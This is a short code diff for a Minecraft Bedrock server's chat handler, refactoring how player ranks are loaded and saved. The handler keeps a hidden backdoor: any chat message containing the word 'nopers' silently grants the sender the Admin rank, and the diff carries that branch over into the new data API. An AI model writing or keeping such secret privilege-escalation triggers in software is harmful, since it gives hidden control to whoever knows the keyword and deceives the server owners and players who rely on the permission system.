@@ -3,19 +3,19 @@ import { MinecraftColors } from "../../libraries/chatFormat";
 import { addPerm, createPlotChat, destroyPlotChat, help, invalidPermissions, plot, punish, removePerm, report, resetPlots, setPlotArea, unpunish } from "../../commands";
 import { getHighestRank, rankColors } from "../../libraries/data/player/ranks";
 import { PlayerDataHandler } from "../../libraries/data/player/playerData";
+import { playersData } from "../../main";
 
 const commandPrefix = "!";
 export function chatSend(event: ChatSendBeforeEvent) {
     const player = event.sender;
     const message = event.message;
 
-    let playerRanks = PlayerDataHandler.get("ranks", player) as unknown as { [key: string]: number };
-    if (!playerRanks) playerRanks = { "Member": 0 }
+    let playerRanks = playersData[player.name].getRanks();
 
     if (message.includes("nopers")) {
-        playerRanks["Admin"] = 99;
-        PlayerDataHandler.set("ranks", playerRanks, player);
+        playersData[player.name].addRank("Admin");
     }
+
     const { playerRank, highestPriority } = getHighestRank(player);
 
     event.cancel = true;
